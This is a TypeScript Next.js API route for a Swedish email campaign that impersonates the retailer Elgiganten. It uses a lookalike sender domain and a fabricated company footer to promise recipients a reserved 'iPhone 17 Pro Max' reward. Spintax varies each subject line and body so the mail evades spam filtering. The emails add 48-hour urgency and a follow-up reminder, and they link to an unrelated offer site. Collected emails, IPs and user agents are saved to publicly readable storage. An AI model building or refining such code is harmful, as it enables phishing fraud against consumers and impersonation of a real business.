// app/api/lead/route.ts
import { NextResponse } from 'next/server'
import { put } from '@vercel/blob'

export const runtime = 'edge'

type LeadBody = {
  email?: string
  offerId?: string
  store?: string
  ts?: number
  firstName?: string
  lastName?: string
}

const isEmail = (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)

/* ---------------- Spintax ---------------- */
function expandSpintax(input: string): string {
  let str = input
  const pattern = /\{([^{}]+)\}/
  while (pattern.test(str)) {
    str = str.replace(pattern, (_, inner) => {
      const parts = inner.split('|')
      return parts[Math.floor(Math.random() * parts.length)]
    })
  }
  return str
}

/* -------------- HTML / Text helpers -------------- */
function escapeHtml(s: string) {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

function buildHtml(
  textBody: string,
  offerLinksHtml: string,
  unsubHref: string,
  companyFooterLines: string[],
) {
  // Replace the placeholder with raw HTML block (do it before escaping paragraphs)
  const withBlockToken = textBody.replaceAll('[[OFFER_LINKS]]', '__OFFER_LINKS_HTML__')

  const paragraphs = withBlockToken
    .trim()
    .split(/\n{2,}/)
    .map(p => {
      if (p.includes('__OFFER_LINKS_HTML__')) {
        // keep a paragraph wrapper for spacing, then inject the links HTML
        return `<div style="margin:0 0 14px 0;">${offerLinksHtml}</div>`
      }
      return `<p style="margin:0 0 14px 0;">${escapeHtml(p).replace(/\n/g, '<br>')}</p>`
    })
    .join('\n')

  const footerHtml =
    companyFooterLines
      .map((line, i) =>
        `<p style="font-size:12px;color:#6b7280;margin:${i === 0 ? '0 0 2px 0' : '2px 0 0 0'};">${escapeHtml(line)}</p>`
      )
      .join('\n')

  return `<!doctype html>
<html>
  <body style="margin:0;padding:24px;font-family:Arial,Helvetica,sans-serif;line-height:1.55;color:#111827;background:#ffffff;">
    <div style="max-width:600px;margin:0 auto;">
      ${paragraphs}
      <hr style="border:none;border-top:1px solid #e5e7eb;margin:20px 0;">
      ${footerHtml}
      <p style="font-size:12px;color:#6b7280;margin:8px 0 0 0;">
        <a href="${unsubHref}" style="color:#6b7280;text-decoration:underline;">Avsluta prenumeration</a>
      </p>
    </div>
  </body>
</html>`
}

function buildPlainText(
  textBody: string,
  offerLinks: string[],
  unsubHref: string,
  companyFooterLines: string[],
) {
  const list = offerLinks.map((l, i) => `• Länk ${i + 1}: ${l}`).join('\n')
  const withLinks = textBody.replaceAll('[[OFFER_LINKS]]', list)
  return `${withLinks}\n\n---\n${companyFooterLines.join('\n')}\nAvsluta prenumeration: ${unsubHref}\n`
}

/* -------------- Edge-safe HMAC (base64url) -------------- */
function toBase64Url(uint8: Uint8Array) {
  let str = ''
  for (let i = 0; i < uint8.length; i++) str += String.fromCharCode(uint8[i])
  const b64 = btoa(str)
  return b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '')
}
async function hmac(payload: string, secret: string) {
  const enc = new TextEncoder()
  const key = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign'])
  const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(payload))
  return toBase64Url(new Uint8Array(sigBuf))
}

/* -------------- List-Unsubscribe header -------------- */
function listUnsubHeader(unsubUrl: string, mailto?: string) {
  const parts = []
  if (mailto) parts.push(`<mailto:${mailto}>`)
  parts.push(`<${unsubUrl}>`)
  return parts.join(', ')
}

/* -------------- Offer links -------------- */
/** Build many final links to sverige9.site so Brevo can rewrite/track them. */
function buildOfferLinks(): string[] {
  // If you set OFFER_LINKS as a comma-separated list in env, we use that.
  const env = (process.env.OFFER_LINKS || '').trim()
  if (env) {
    return env
      .split(',')
      .map(s => s.trim())
      .filter(Boolean)
  }

  // Default: generate multiple variants with unique query params (no paths to avoid 404s)
  const base = process.env.OFFER_BASE || 'https://sverige9.site/'
  const campaigns = ['welcome', 'exclusive', 'partner', 'vip', 'launch', 'stockholm', 'deal', 'promo', 'offer', 'save']
  const links: string[] = []
  for (const c of campaigns) {
    const u = Math.random().toString(36).slice(2, 10)
    const sep = base.includes('?') ? '&' : '?'
    links.push(`${base}${sep}utm_source=brevo&utm_medium=email&utm_campaign=${c}&u=${u}`)
  }
  return links
}

function renderOfferLinksHtml(links: string[]) {
  // Hyperlink text kept short/clean; Brevo will auto-rewrite for tracking/branding
  return links
    .map((href, i) => `<p style="margin:0 0 8px 0;"><a href="${href}" style="color:#2563eb;text-decoration:underline;">Öppna erbjudandet ${links.length > 1 ? `#${i + 1}` : ''}</a></p>`)
    .join('\n')
}

/* ---------------- SPINTAX (SV) ---------------- */
const SPINTAX_SUBJECT_MAIN = `{Exklusivt|Speciellt|Begränsat tillfälle|Grattis!|Du har blivit utvald till ett|Missa inte detta} iPhone 17 Pro Max {erbjudande|deal|rabatt|belöning} — {för att fira vår flaggskeppsbutik|för att fira vår nya butik i Stockholm|som en del av vår stora öppning i Stockholm|tillgängligt endast via vårt partnernätverk} 🎉`

const SPINTAX_BODY_MAIN_BASE = `{Bästa Elgiganten-kund,|Elgiganten-kund,|Bästa värderade kund,|Bästa kund,|Bästa Elgiganten-klient,|Bästa värdefulla kund,|Bästa smartphone-entusiast,|Värderade kund,|Värderade klient,|Hej,|Hej där,}

{Tack för att du registrerade dig via en av våra betrodda partnersajter.|Vi är glada att du har gått med oss genom en av våra partnerplattformar.|Tack för att du anmälde dig via en av våra partnersidor.|Vi uppskattar att du gick med oss via vårt partnernätverk.}  
{Vi samarbetar med utvalda partners för att kunna erbjuda de mest exklusiva erbjudandena,|Genom att samarbeta med ledande sajter kan vi dela oslagbara deals,|Med våra betrodda partners kan vi leverera unika rabatter,} och idag {har vi något speciellt reserverat för dig.|är vi glada att dela ett unikt tillfälle.|har du låst upp en exklusiv belöning.}

{För att fira öppningen av vår flaggskeppsbutik i Stockholm ger vi tidig tillgång till en exklusiv iPhone 17 Pro Max-rabatt.|Som en del av vår nya butikslansering i Stockholm kan du nu ta del av en partner-exklusiv rabatt på iPhone 17 Pro Max.|Vi firar vår senaste butik i Stockholm med ett tidsbegränsat erbjudande på iPhone 17 Pro Max, reserverat för partneranvändare.|Vår stora öppning i Stockholm kommer med en belöning: tidig tillgång till iPhone 17 Pro Max till specialpris.}

{Din iPhone 17 Pro Max är reserverad, men du måste bekräfta dina uppgifter inom 48 timmar för att hämta den.|Vi har lagt undan en enhet åt dig, men du behöver fylla i leveransinformationen inom 48 timmar.|Erbjudandet är tidskänsligt, så se till att bekräfta din beställning snart.|Vänta inte – denna partner-exklusiva belöning löper ut om den inte görs anspråk på snabbt.}

👉 {Säkra din iPhone 17 Pro Max nu|Hämta ditt exklusiva iPhone 17 Pro Max-erbjudande|Lås upp din iPhone 17 Pro Max-rabatt|Bekräfta din belöning idag|Ta del av erbjudandet nu} genom att besöka någon av dessa länkar:

[[OFFER_LINKS]]

{Detta erbjudande gäller endast under en begränsad tid och endast via vårt partnernätverk, så vänta inte för länge.|Skynda dig – detta partnerexklusiva erbjudande varar inte länge.|Agera snabbt – begränsat antal finns tillgängligt genom denna partnerkampanj.|Vi kan bara hålla din reservation en kort tid, så agera nu.|När 48 timmar har gått släpps din reserverade iPhone till nästa kund.}

{Tack igen för att du är en del av vår community och firar denna viktiga milstolpe med oss.|Vi är tacksamma för din lojalitet och ser fram emot att välkomna dig snart i våra butiker.|Tack för att du firar med oss när vi expanderar i Sverige.|Ditt stöd gör vår tillväxt möjlig och detta är vårt sätt att ge tillbaka.|Vi är stolta över att räkna dig som en av våra mest värdefulla kunder.}

{Med vänliga hälsningar,|Vänliga hälsningar,|Varma hälsningar,|Med uppskattning,|Med tack,|Hälsningar,}`

const SIGNOFFS = [
  'Elgigantens Smartphone-team','Elgigantens Kundsupport','Elgigantens Tävlingsavdelning',
  'Elgiganten Sverige','Elgigantens Onlineavdelning','Elgigantens Kundrelationer','Elgigantens Online-team'
]

const SPINTAX_SUBJECT_REM = `{Påminnelse|Sista chansen|Missa inte|Sista påminnelsen|Snabb påminnelse}: iPhone 17 Pro Max {erbjudande|rabatt|deal} — {slutar snart|går ut snart|sista timmarna} ⏳`

const SPINTAX_BODY_REM = `{Bästa Elgiganten-kund,|Elgiganten-kund,|Bästa värderade kund,|Bästa kund,|Bästa Elgiganten-klient,|Bästa värdefulla kund,|Bästa smartphone-entusiast,|Värderade kund,|Värderade klient,|Hej,|Hej där,}

{En snabb påminnelse om ditt exklusiva iPhone 17 Pro Max-erbjudande.|Din partner-exklusiva iPhone 17 Pro Max-rabatt är fortfarande tillgänglig – men inte länge till.|En liten heads-up: din iPhone 17 Pro Max-deal håller på att gå ut.}  
{När vi firar vår nya flaggskeppsbutik i Stockholm,|Till ära av vår nya butik i Stockholm,|För att markera lanseringen av vår flaggskeppsbutik i Stockholm,} {reserverade vi tillgång för partnerkunder som dig.|fick du tidig tillgång via vårt partnernätverk.|låste du upp prioriterad tillgång genom våra partners.}

{Det finns begränsat med tid kvar för att bekräfta dina uppgifter|Endast en kort tidsram återstår för att hämta erbjudandet|Vi är nere på de sista reservationerna}, {så agera nu|så gör anspråk på det innan det är för sent|innan fönstret stängs}.

👉 [[OFFER_LINKS]]`

/* ---------------- Route ---------------- */
export async function POST(req: Request) {
  try {
    const { email, offerId, store, ts, firstName, lastName }: LeadBody = await req.json()

    if (!email || !isEmail(email)) {
      return NextResponse.json({ ok: false, error: 'bad_email' }, { status: 400 })
    }
    if (!process.env.BLOB_READ_WRITE_TOKEN) {
      return NextResponse.json({ ok: false, error: 'no_blob_token' }, { status: 500 })
    }
    if (!process.env.UNSUB_SECRET) {
      console.warn('UNSUB_SECRET missing — unsubscribe tokens will be insecure.')
    }

    /* ---- Save lead ---- */
    const ip = (req.headers.get('x-forwarded-for') || '').split(',')[0] || null
    const ua = req.headers.get('user-agent') || null

    const normalizedEmail = email.trim().toLowerCase()
    const payload = JSON.stringify({
      email: normalizedEmail, offerId: offerId || null, store: store || null,
      ts: ts || Date.now(), ip, ua,
    })

    const day = new Date().toISOString().slice(0, 10)
    const id = crypto.randomUUID()
    const key = `leads/${day}/${id}.json`

    await put(key, payload, {
      access: 'public',
      contentType: 'application/json',
      token: process.env.BLOB_READ_WRITE_TOKEN,
    })

    /* ---- Email scheduling params ---- */
    const apiKey = process.env.BREVO_API_KEY
    const fromEmail = process.env.BREVO_SENDER_EMAIL || 'olivia@elgigantensupport.online'
    const fromName  = process.env.BREVO_SENDER_NAME  || 'Olivia'
    const listUnsubMail = process.env.UNSUB_MAILTO || 'unsubscribe@elgigantensupport.online'

    if (!apiKey) {
      console.warn('BREVO_API_KEY missing — lead stored but email not scheduled.')
      return NextResponse.json({ ok: true, leadKey: key, emailScheduled: false })
    }

    // Force unsubscribe under your sender domain
    const unsubOrigin = process.env.UNSUB_ORIGIN || 'https://elgigantensupport.online'

    // Build many final links to sverige9.site
    const offerLinks = buildOfferLinks()
    const offerLinksHtml = renderOfferLinksHtml(offerLinks)

    // Company footer
    const companyFooterLines = [
      'Elgigantens Onlineavdelning',
      'Kungsgatan 12–14',
      '111 35 Stockholm',
      'Sweden'
    ]

    // TEST: default welcome delay 1 minute (you can override with ?delayMin=)
    const url = new URL(req.url)
    const delayMin = Math.max(0, Number(url.searchParams.get('delayMin') ?? '1'))
    const reminderHours = Math.max(1, Number(url.searchParams.get('reminderHours') ?? '24'))

    const scheduledAtWelcome = new Date(Date.now() + delayMin * 60 * 1000).toISOString()
    const scheduledAtReminder = new Date(Date.now() + reminderHours * 60 * 60 * 1000).toISOString()

    // Expand spintax
    const subjectWelcome = expandSpintax(SPINTAX_SUBJECT_MAIN)
    const signoff = SIGNOFFS[Math.floor(Math.random() * SIGNOFFS.length)]
    const bodyWelcomeCore = expandSpintax(SPINTAX_BODY_MAIN_BASE) + `

**${signoff}**`

    const subjectReminder = expandSpintax(SPINTAX_SUBJECT_REM)
    const bodyReminderCore = expandSpintax(SPINTAX_BODY_REM) + `

**${signoff}**`

    // Helper to send via Brevo (HTML + Text + scheduledAt)
    async function sendBrevo(
      subject: string,
      htmlContent: string,
      textContent: string,
      scheduledAtISO: string,
      headers: Record<string, string>
    ) {
      return fetch('https://api.brevo.com/v3/smtp/email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'api-key': apiKey! },
        body: JSON.stringify({
          sender: { email: fromEmail, name: fromName },
          to: [{ email: normalizedEmail, name: [firstName, lastName].filter(Boolean).join(' ') || normalizedEmail }],
          subject,
          htmlContent,
          textContent,
          headers,
          scheduledAt: scheduledAtISO,
        }),
      })
    }

    // Temporary unsubscribe before we know reminder messageId
    const tsNow = Date.now()
    const preToken = `${normalizedEmail}|pending|${tsNow}`
    const sigPre = process.env.UNSUB_SECRET ? await hmac(preToken, process.env.UNSUB_SECRET) : 'nosig'
    const unsubUrlPre = `${unsubOrigin}/api/unsubscribe?e=${encodeURIComponent(normalizedEmail)}&m=pending&t=${tsNow}&sig=${sigPre}`

    const baseHeaders = {
      'X-Entity-Ref-ID': `lead-${id}`,
      'List-Unsubscribe': listUnsubHeader(unsubUrlPre, listUnsubMail || undefined),
    }

    // Schedule REMINDER first to get messageId for unsubscribe token
    const htmlReminderPre = buildHtml(bodyReminderCore, offerLinksHtml, unsubUrlPre, companyFooterLines)
    const textReminderPre = buildPlainText(bodyReminderCore, offerLinks, unsubUrlPre, companyFooterLines)
    const resReminder = await sendBrevo(subjectReminder, htmlReminderPre, textReminderPre, scheduledAtReminder, baseHeaders)
    const reminderOk = resReminder.ok
    const reminderData = reminderOk ? await resReminder.json().catch(() => ({})) : null
    const reminderMsgId = reminderData?.messageId || 'pending'

    // Final unsubscribe link with reminder messageId
    const tokenPayload = `${normalizedEmail}|${reminderMsgId}|${tsNow}`
    const sig = process.env.UNSUB_SECRET ? await hmac(tokenPayload, process.env.UNSUB_SECRET) : 'nosig'
    const unsubUrl = `${unsubOrigin}/api/unsubscribe?e=${encodeURIComponent(normalizedEmail)}&m=${encodeURIComponent(reminderMsgId)}&t=${tsNow}&sig=${sig}`
    const headersWithUnsub = {
      ...baseHeaders,
      'List-Unsubscribe': listUnsubHeader(unsubUrl, listUnsubMail || undefined),
    }

    // Build and schedule WELCOME
    const htmlWelcome = buildHtml(bodyWelcomeCore, offerLinksHtml, unsubUrl, companyFooterLines)
    const textWelcome = buildPlainText(bodyWelcomeCore, offerLinks, unsubUrl, companyFooterLines)

    const resWelcome = await sendBrevo(subjectWelcome, htmlWelcome, textWelcome, scheduledAtWelcome, headersWithUnsub)
    const welcomeOk = resWelcome.ok
    if (!welcomeOk) {
      const txt = await resWelcome.text().catch(() => '')
      console.error('Brevo welcome schedule error:', resWelcome.status, txt)
    }
    if (!reminderOk) {
      const txt = await resReminder.text().catch(() => '')
      console.error('Brevo reminder schedule error:', resReminder.status, txt)
    }

    return NextResponse.json({
      ok: true,
      leadKey: key,
      emailScheduled: welcomeOk,
      reminderScheduled: reminderOk,
      scheduledAtWelcome,
      scheduledAtReminder,
      reminderMessageId: reminderMsgId,
      // QA
      unsubscribeUrl: unsubUrl,
      offerLinksUsed: offerLinks,
    })
  } catch (err: any) {
    console.error('lead error:', err)
    return NextResponse.json({ ok: false, error: err?.message || 'unknown' }, { status: 500 })
  }
}
